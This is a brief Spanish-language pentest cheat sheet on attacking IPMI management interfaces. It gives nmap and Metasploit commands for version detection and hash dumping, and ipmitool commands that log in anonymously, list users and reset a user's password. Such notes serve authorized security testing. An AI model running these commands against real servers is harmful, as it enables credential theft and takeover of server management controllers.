
- detección de versión

```sh
msf6 auxiliary(scanner/ipmi/ipmi_version)

nmap -sU --script ipmi-version -p 623 <ip>
```

- dump hashes

```sh
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)
```

- conexión anónima

```
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list

ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 newpassword
```

